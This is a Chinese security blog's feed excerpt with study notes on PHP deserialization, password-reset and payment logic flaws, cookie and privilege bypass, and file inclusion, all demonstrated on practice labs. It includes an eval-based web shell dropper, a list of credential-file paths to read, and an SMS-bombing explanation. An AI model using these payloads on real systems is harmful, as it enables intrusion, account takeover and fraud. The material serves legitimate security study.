class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>=<span class="string">&#x27;flag&#123;****&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;cxk&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>=<span class="string">&#x27;10&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;flag=<span class="string">&#x27;no flag&#x27;</span>;        <span class="comment">//在反序列化时，flag属性将被改变为“no flag”</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctfer</span>=<span class="keyword">new</span> <span class="title class_">Ctf</span>();     <span class="comment">//实例化一个对象</span></span><br><span class="line"><span class="variable">$ctfer</span>-&gt;flag=<span class="string">&#x27;flag&#123;adedyui&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$ctfer</span>-&gt;name=<span class="string">&#x27;Sch0lar&#x27;</span>;</span><br><span class="line"><span class="variable">$ctfer</span>-&gt;age=<span class="string">&#x27;18&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable">$str</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$ctfer</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li>反序列化之前重新给flag属性赋值</li></ul><h2 id="反序列化POP链"><a href="#反序列化POP链" class="headerlink" title="反序列化POP链"></a>反序列化POP链</h2><ul><li><code>unserialize()</code>反序列化函数用于将单一的已序列化的变量转换回 PHP 的值。</li><li>当反序列化参数可控时，可能会产生<strong>PHP反序列化漏洞</strong>。</li><li>在反序列化中，我们所能控制的数据就是对象中的各个属性值，所以在PHP的反序列化中有一种漏洞利用方法叫做 “面向属性编程POP”，面向对象编程从一定程度上来说，就是完成类与类之间的调用。POP链起于一些小的“组件”，这些小“组件”可以调用其他的“组件”</li><li>在PHP中，“组件”就是那些魔术方法（如：wakeup()或destruct）</li><li>面向属性编程（Property-Oriented Programing）常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链做一些工作了。</li></ul><h1 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ul><li>未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行，SQL注入，目录遍历等不可控后果。</li><li>在反序列化的过程中自动触发了某些魔术方法。</li></ul><h2 id="触发条件"><a href="#触发条件" class="headerlink" title="触发条件"></a>触发条件</h2><ul><li>unserialize函数的参数、变量可控，php文件中存在可利用的类，类中有魔术方法</li></ul><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><ul><li><code>__construct()</code> 当对象创建（new）时会自动调用。但在 <code>unserialize()</code> 时是不会自动调用的。</li><li><code>__destruct()</code> 当一个对象销毁（反序列化）时被调用</li><li><code>__toString()</code>当一个对象被当作一个字符串使用时被调用</li><li><code>__sleep()</code>在对象在被序列化之前立即运行</li><li><code>__wakeup()</code>将在序列化之后立即被调用</li><li>而在反序列化时，如果反序列化对象中存在魔法函数，使用unserialize()函数同时也会触发。这样，一旦我们能够控制unserialize()入口，那么就可能引发对象注入漏洞。</li></ul><h2 id="绕过魔法方法的反序列化漏洞"><a href="#绕过魔法方法的反序列化漏洞" class="headerlink" title="绕过魔法方法的反序列化漏洞"></a>绕过魔法方法的反序列化漏洞</h2><ul><li>漏洞CVE-2016-7124</li></ul><h3 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a><code>__wakeup()</code></h3><ul><li>将在序列化之后立即被调用  </li><li>当序列化字符串表示对象属性个数的数字值<strong>大于</strong>真实类中属性的个数时就会<strong>跳过__wakeup的执行</strong>。</li></ul><h3 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a><code>__destruct()</code></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$var</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span>　</span><br></pre></td></tr></table></figure><ul><li>要让<code>eval($this-&gt;var);</code>执行我们的恶意代码，我们就需要修改属性<code>$var</code>的值。接下来构造序列化数据：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">Example</span>();</span><br><span class="line"><span class="variable">$obj</span>-&gt;<span class="keyword">var</span>=<span class="string">&#x27;phpinfo()&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>));</span><br></pre></td></tr></table></figure></li><li>输出<code>O:7:&quot;Example&quot;:1:&#123;s:3:&quot;var&quot;;s:9:&quot;phpinfo()&quot;;&#125;</code></li><li>输出执行<code>eval(phpinfo())</code></li></ul><h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a><code>__toString()</code></h3><ul><li><code>__toString</code>当对象被当作一个字符串使用时候调用(不仅仅是<code>echo</code>的时候，比如file_exists()判断也会触发)</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> web安全 </tag>
            
            <tag> php反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>找回机制及接口安全</title>
      <link href="/2023/10/21/%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6%E5%8F%8A%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8/"/>
      <url>/2023/10/21/%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6%E5%8F%8A%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="找回机制"><a href="#找回机制" class="headerlink" title="找回机制"></a>找回机制</h1><ul><li>当找回密码的时候，涉及到验证码，通过验证码来验证是否为本人操作</li><li>这个地方的安全问题，未验证验证码的匹配关系</li></ul><h2 id="客户端回显"><a href="#客户端回显" class="headerlink" title="客户端回显"></a>客户端回显</h2><ul><li>这种就是再调用短信平台或者邮箱平台的时候，没有判定验证码和手机号或者邮件进行绑定，并且把验证码检验直接放在客户端的返回数据包中，从而导致验证码在客户端中显示。但是也存在对内容进行加密的情况，若遇到加密，先看看是否能够解密，若无法解密再想其他办法。</li></ul><h2 id="Response状态值"><a href="#Response状态值" class="headerlink" title="Response状态值"></a>Response状态值</h2><ul><li>Response状态值，就是在服务器发送某个密码重置的凭据之后，出现特定的响应值(ture，1，ok，success等等，例如响应头中的HTTP&#x2F;1.1 200 ok)，而且例如如果回显值得校验是发送到客户端进行，通过对校验值得使用规则进行分析后，抓包将Response状态值改为正确的，然后放包，这样就能够从而达到重置密码得效果。</li></ul><h2 id="验证码爆破"><a href="#验证码爆破" class="headerlink" title="验证码爆破"></a>验证码爆破</h2><ul><li>发送给我们的验证码是纯数字，比如四位，或者是六位，在短时间内进行爆破，可以得到接收到的验证码，比如发送给我是1234，我们可以把请求验证码的数据包截获到，然后不断的去请求验证码的正确与否，从0000-9999，全部测试一遍，其中1234就在里面，这个时候就存在验证码爆破</li><li>如果对方是数字加字母区分大小写，那这种可能性实在是太多了，我们可以不爆破，就是说爆破的机会不大</li><li>验证码有一个生效时间，就是过了这段时间，密码就不能生效了，一分钟、两分钟，我们跑这个爆破的数量达不到，这样子，我们只能放弃它</li><li>验证码锁定，验证码输出三次之后还是失败，直接锁定，不让使用，这也是没办法</li></ul><h2 id="找回流程绕过"><a href="#找回流程绕过" class="headerlink" title="找回流程绕过"></a>找回流程绕过</h2><ul><li>一般是把验证码发送到手机或者邮箱上面，你输入正确之后，就跳到第三个页面，就是重置密码页面。</li><li>我们可以先来一个正常的用户去操作一下，然后看一下重置页面当前的地址和数据包，然后我们在换一个我们不知道验证码的手机号去找回，我们直接跳过输入验证码的那一步，直接用数据包截获到，然后把他丢弃掉，直接用浏览器去请求第三步，直接跳过验证码的验证内容。</li><li>这种就是跳过，就是从第一步跳到第三步，就是绕过第二步的验证</li></ul><h1 id="接口调用"><a href="#接口调用" class="headerlink" title="接口调用"></a>接口调用</h1><ul><li>网上有很多短信轰炸的软件和平台，那么他实现的原理是用别人的接口，比如说有些网站正常注册上去的话，就会发送验证码，他就把接口触发验证码的数据包，给记录下来，然后用软件或者程序，去批量去测试就完事了，那就是调用别人的接口实现短信轰炸，来电轰炸也是这么个原理</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> web安全 </tag>
            
            <tag> 逻辑越权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>支付漏洞及cookie脆弱性</title>
      <link href="/2023/10/20/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E%E5%8F%8Acookie%E8%84%86%E5%BC%B1%E6%80%A7/"/>
      <url>/2023/10/20/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E%E5%8F%8Acookie%E8%84%86%E5%BC%B1%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<h1 id="支付漏洞"><a href="#支付漏洞" class="headerlink" title="支付漏洞"></a>支付漏洞</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li><strong>支付漏洞</strong>在漏洞中一直是处于高风险漏洞，对于企业来说相应的危害是很大的，同样对于用户的风险也很大的，比如当攻击者通过修改，使用他人账号的余额进行购买，那么就属于支付中的越权漏洞了。</li><li>购买流程：选择商品和数量——产生订单——选择邮寄地址及支付方式——订单支付——完成支付。</li><li>支付漏洞就是针对以上流程进行越权操作</li></ul><h2 id="支付漏洞分类"><a href="#支付漏洞分类" class="headerlink" title="支付漏洞分类"></a>支付漏洞分类</h2><h3 id="修改支付价格"><a href="#修改支付价格" class="headerlink" title="修改支付价格"></a>修改支付价格</h3><ul><li>对于修改支付价格，通常来说购买一件物品需要选中自己所需购买的物品，其次确认相关的信息，最后支付价钱，而在这个过程中，可以在选中时就修改价格，若有相关的验证，则可以向后边退，一步一步测试。</li></ul><h3 id="修改支付状态"><a href="#修改支付状态" class="headerlink" title="修改支付状态"></a>修改支付状态</h3><ul><li>其实这里的支付状态挺好理解的，把支付未成功修改为支付成功即可，这个也是由于支付的状态未和实际订单的支付状态进行校验而产生的。</li></ul><h3 id="修改购买数量"><a href="#修改购买数量" class="headerlink" title="修改购买数量"></a>修改购买数量</h3><ul><li>在支付的过程中，数量也同时决定着价格，比如：1个数量商品对应的是100，2个数据就是200，那么当你修改这个值数量值为负数时，那么其金额也会变为负数，最后就会导致支付问题的产生。</li></ul><h3 id="替换支付"><a href="#替换支付" class="headerlink" title="替换支付"></a>替换支付</h3><ul><li>替换支付简单来说，首先去产生两个订单，但是这两个订单的商品是不一样的，其价格也是不一样的，如果服务端未做好相应的验证，那么在支付过程中去替换数据，最后支付，这时候就可以使用订单支付的价格购买到其他贵的物品。</li></ul><h3 id="越权支付"><a href="#越权支付" class="headerlink" title="越权支付"></a>越权支付</h3><ul><li>在支付当中会出现当前用户的ID，比如：username&#x3D;XXXXX，如果没有加以验证，其支付也是一次性支付没有要求输入密码什么的机制，那么就可以修改这个用户ID为其它用户ID，达到用其他用户的账号进行支付你的商品。</li></ul><h3 id="修改优化价"><a href="#修改优化价" class="headerlink" title="修改优化价"></a>修改优化价</h3><ul><li>比如一些商品有优惠价，优惠多少多少，那么在支付时抓包，修改这个优惠价就可造成支付问题的产生。</li></ul><h2 id="常用篡改参数"><a href="#常用篡改参数" class="headerlink" title="常用篡改参数"></a>常用篡改参数</h2><ul><li>商品的ID编号、购买价格、购买数量、支付方式、订单号、支付状态等。</li></ul><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><ul><li>这里用<a href="https://pan.baidu.com/s/15SzFGW37fpBkO38_St3SmA?pwd=onew">大米cms</a>进行实验</li><li>注册一个用户test<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231020213928.png" alt="image.png"></li><li>随便选一个商品购买然后抓包<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231020214139.png" alt="image.png"></li><li>修改价格<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231020214216.png" alt="image.png"></li><li>可以看见价格已经被修改了</li><li>还可以修改其他信息，包括商品id等等</li></ul><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ol><li>对商品的价格进行判断，不能为负数。</li><li>商品的价格以数据库的为准，不能以页面为准。</li><li>设置类似的token值来对数据包进行唯一性处理</li></ol><h1 id="cookie脆弱性"><a href="#cookie脆弱性" class="headerlink" title="cookie脆弱性"></a>cookie脆弱性</h1><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><ol><li>用户在客户端 (一般为浏览器) 中访问某个页面 ，也就是向服务器发送请求。</li><li>服务器收到请求后，会在响应头中设置Set-Cookie字段值，该字段存储相关信息和状态。</li><li>客户端解析服务器HTTP响应头中的Set-Cookie字段，并以key&#x3D;value的形式保存在本地，之后客户端每次发送HTTP请求时，都会在请求头中增加Cookie字段。</li><li>服务器接收到客户端的HTTP请求之后，会从请求头中取出Cookie数据，来校验客户端状态或身份信息。</li></ol><h2 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h2><ul><li>这里使用<a href="https://pan.baidu.com/s/1vn-jLpqb-_HKNphebD9N3Q?pwd=lldw">熊海靶场</a>进行实验</li><li>这个越权登录，其实是基于代码审计获取得，也就相当于是白盒测试，若黑盒测试，基本上应该是测试不出来的。</li><li><strong>代码审计：</strong><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$user</span>=<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$user</span>==<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ?r=login&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li>通过代码知道，cookie当中会有user信息，如果为空则进入登录页面，否则进行登录</li><li>直接在url后加admin会进入登录界面</li><li>因为我们没登陆过<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231020221903.png" alt="image.png"></li><li>这里我们清理一下cookie信息，并进行抓包<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231020222029.png" alt="image.png"></li><li>抓包信息当中，没有cookie</li><li>我们手动加入cookie信息</li><li>设定user为1，即不为空<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231020222407.png" alt="image.png"></li><li>放包，可以看见成功进入admin，最高权限用户<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231020222606.png" alt="image.png"></li></ul><h2 id="越过条件"><a href="#越过条件" class="headerlink" title="越过条件"></a>越过条件</h2><ul><li>其实在这里可以看到我们直接输入了cookie: user&#x3D;1，那么我们该如何知道这个cookie值需要使用到user呢？所以相对来说挺鸡肋的，在实战中若没有源码基本上不可能绕过，所以这多数适合在白盒测试中，如果一定要使用黑盒测试，那么就需要在网上找相应的源码进行分析，但若别人修改了，那么基本上就是凉凉的节奏，不可能被绕过的。</li></ul><h2 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h2><ol><li>根据交互所需的传输范围，设置适当的Cookie有效时间</li><li>对cookie加密以及数字签名，并在安全信道中传输</li><li>用URL参数代替cookie中可能包含的敏感信息</li><li>不要在cookie中设置中文</li><li>合理设置Cookies中的安全属性</li><li>服务器不应该在同一个主机上同时运行相互不信任的服务<br>客户端回显、response状态值、验证码爆破、找回流程绕过等。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> web安全 </tag>
            
            <tag> 逻辑越权 </tag>
            
            <tag> 支付漏洞 </tag>
            
            <tag> cookie </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逻辑越权</title>
      <link href="/2023/10/20/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83/"/>
      <url>/2023/10/20/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231020193248.png" alt="image.png"></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><ul><li>逻辑越权漏洞就是当用户跳过自己的权限限制，去操作同等级用户或者上级用户。正常的情况下，当一个用户去访问某个资源的时候，首先需要去登录验证自己的权限，其次是对数据的查询，最后返回数据内容。</li><li>但是如果在权限验证这里，出现了验证不足或者根本就没有验证，那么就会导致越权漏洞的出现。并且逻辑越权又分为水平越权和垂直越权。</li><li>逻辑越权主要是由于开发人员在对数据的增删改查的对人员客户端的请求数据过分相信，未对其进行权限判定而导致的问题。</li></ul><h1 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ul><li>水平越权也就是同等级越权，可以理解为本来A只能够看自己的工资，而通过更换某个ID或者其他的验证身份的操作，就能够A去看B的工资。</li><li>水平越权多数会出现在和数据库进行增删改查的地方，若用户在对其进行信息修改的时候，后台没对其进行严格的校验的话或者校验的规则较简单的情况下，就可能会出现越权漏洞。</li><li>水平越权的危害可以导致用户的个人信息泄露，冒充别人等。</li></ul><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><ul><li>使用pikachu靶场进行实例演示</li><li>在提示中随便选择一个用户登录</li><li>这里选择了lucy<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231020194812.png" alt="image.png"></li><li>登录之后可以查看个人信息<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231020195218.png" alt="image.png"></li><li>抓包然后发现是直接username获取个人信息</li><li>直接修改username为另一个人就行<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231020195909.png" alt="image.png"></li></ul><h1 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><ul><li>垂直越权就是通过自身低权限账号去执行高权限账号所能执行的操作。</li><li>垂直越权漏洞可以考虑低权限提升为高权限，比如让普通的用户变成管理员用户。</li><li>其实垂直越权漏洞是需要一定的条件的，需要抓取到高权限用户的数据包，而抓取这个数据包是有一定的困难的，比如可以盲猜数据包，或者通过网站获取源码本地搭建去获取。</li><li>垂直越权的危害可以导致普通用户修改他人的密码，篡改他人信息，依旧个人信息泄露等。</li></ul><h2 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h2><ul><li>首先登录admin用户</li><li>admin拥有最大权限，可以增加或者删除用户信息<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-20%20205646.png" alt="屏幕截图 2023-10-20 205646.png"></li><li>添加用户<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231020205733.png" alt="image.png"></li><li>并且抓包，获取到post包<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231020205939.png" alt="image.png"></li><li>然后登录pikachu用户，就是普通用户</li><li>普通用户只有查看的权限，不能修改用户列表<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231020210054.png" alt="image.png"></li><li>获取到普通用户的cookie信息<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231020210503.png" alt="image.png"></li><li>然后将普通用户的cookie替换<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231020210852.png" alt="image.png"></li><li>然后发包，在该用户登录的情况下</li><li>刷新用户列表就可以看到添加成功了<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231020211020.png" alt="image.png"></li><li>如果在退出用户的情况下，是没办法添加的</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> web安全 </tag>
            
            <tag> 逻辑越权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含漏洞</title>
      <link href="/2023/10/19/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/10/19/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231019154502.png" alt="image.png"></p><h1 id="文件包含漏洞简介"><a href="#文件包含漏洞简介" class="headerlink" title="文件包含漏洞简介"></a>文件包含漏洞简介</h1><ul><li>程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时候直接调用此文件，而无须再次编写，这种调用文件的过程称为包含。</li><li>程序员为了使代码更加灵活，经常将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成<strong>文件包含漏洞。</strong></li><li>文件包含漏洞分为本地包含（LFI）和远程包含（RFI）。文件包含漏洞在 PHP Web Application中居多，在JSP ASP程序中偏少。<blockquote><p>PHP中有四个文件包含的函数</p><ol><li>include()：找不到被包含的文件时只会产生警告（E_WARNING），脚本将会继续执行；</li><li>include_once()：与include（）类似，唯一的区别是如果该文件中的代码已经被包含，则不会再次包含；</li><li>require()：找不到被包含的文件时会产生致命错误（E_COMPILE_ERROR），并停止脚本；</li><li>require_once()：- 该函数和require（）类似，区别在于若该文件中的代码已经被包含，则不会再次包含。</li></ol></blockquote></li></ul><h1 id="漏洞产生原因"><a href="#漏洞产生原因" class="headerlink" title="漏洞产生原因"></a>漏洞产生原因</h1><ul><li><p>利用一个例子来展示这个漏洞</p></li><li><p>先创建一个网页代码<code>include.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>再创建一个php代码<code>phpinfo.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>利用文件包含就可以执行phpinfo.php的页面<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231019160203.png" alt="image.png"></p></li><li><p>此时我们将<code>phpinfo</code>的后缀名改成<code>.jpg</code>、<code>.txt</code>、<code>.gif</code>都会被解析出来</p></li><li><p>所有就可以利用这个漏洞，将恶意代码通过文件包含的方式进行解析利用</p></li></ul><h1 id="本地文件包含漏洞（LFI）"><a href="#本地文件包含漏洞（LFI）" class="headerlink" title="本地文件包含漏洞（LFI）"></a>本地文件包含漏洞（LFI）</h1><ul><li>能够打开并包含本地文件的漏洞，称为本地文件包含漏洞（LFI）<blockquote><p>一些常见的敏感目录信息路径：<br><strong>Windows系统</strong></p><ol><li>查看系统版本C:\boot.ini </li><li>IIS配置文件C:\windows\system32\inetsrv\MetaBase.xml </li><li>存储Windows系统初次安装的密码C:\windows\repair\sam </li><li>Mysql配置C:\ProgramFiles\mysql\my.ini </li><li>MySQL root密码C:\ProgramFiles\mysql\data\mysql\user.MYD </li><li>php配置信息C:\windows\php.ini<br><strong>Linux&#x2F;Unix系统</strong></li><li>&#x2F;etc&#x2F;password &#x2F;&#x2F;账户信息</li><li>&#x2F;etc&#x2F;shadow &#x2F;&#x2F;账户密码信息</li><li>&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F;Apache2默认配置文件</li><li>&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhost.conf &#x2F;&#x2F;虚拟网站配置</li><li>&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F;PHP相关配置</li><li>&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F;Apache配置文件</li><li>&#x2F;etc&#x2F;my.conf &#x2F;&#x2F;mysql配置文件</li></ol></blockquote></li></ul><h2 id="实例pikachu"><a href="#实例pikachu" class="headerlink" title="实例pikachu"></a>实例pikachu</h2><ul><li>在选择框当中有五个选择，通过查看器看到分别对应五个文件</li><li>通过抓包，对filename进行修改<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231019162959.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231019163109.png" alt="image.png"></li><li>可以看到在include文件夹下，所有需要使用相对地址<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231019195718.png" alt="image.png"></li><li>改成相对地址就可以访问了<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231019195903.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231019195942.png" alt="image.png"></li><li>通过文件包含漏洞就可以获取到系统的敏感信息</li></ul><h2 id="实例DVWA"><a href="#实例DVWA" class="headerlink" title="实例DVWA"></a>实例DVWA</h2><ul><li>当一时没发现系统文件上传漏洞或者文件上传格式有严格限制时，可以上传一张图片马到服务器，再利用文件包含漏洞进行解析。</li><li>制作图片马<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;shell.php&quot;</span>,<span class="string">&quot;w&quot;</span>),<span class="string">&#x27;&lt;?php eval($_POST[123]) ?&gt;;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231019203819.png" alt="image.png"></li><li>然后在文件上传File Upload处上传图片马<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231019203834.png" alt="image.png"></li><li>通过回显知道了文件路径</li><li>然后在文件包含当中运行<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231019204157.png" alt="image.png"></li></ul><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231019204148.png" alt="image.png"></p><ul><li>运行成功<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231019204244.png" alt="image.png"></li><li>然后用中国蚁剑连上去<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231019204401.png" alt="image.png"></li><li>连接成功</li></ul><h1 id="远程文件包含漏洞（RFI）"><a href="#远程文件包含漏洞（RFI）" class="headerlink" title="远程文件包含漏洞（RFI）"></a>远程文件包含漏洞（RFI）</h1><ul><li>当<code>php.ini</code>中<code>allow_url_fopen</code>和<code>allow_url_include</code>为On时，文件包含函数是可以<strong>加载远程文件</strong>的，这类漏洞被称为<strong>远程文件包含漏洞</strong>。<br><img 